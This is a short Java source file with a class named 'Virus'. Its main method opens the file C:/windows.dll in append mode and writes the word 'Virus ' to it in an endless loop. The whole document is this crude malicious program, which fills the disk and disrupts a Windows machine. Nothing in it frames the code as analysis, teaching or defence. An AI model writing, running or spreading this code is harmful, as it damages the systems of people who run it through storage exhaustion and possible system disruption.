
import java.io.FileWriter;


public class Virus {
    public static void main(String[] args) throws Exception {
            FileWriter fw=new FileWriter("C:/windows.dll",true);
            while(true)
            {
                fw.write("Virus ");
            }
}
}
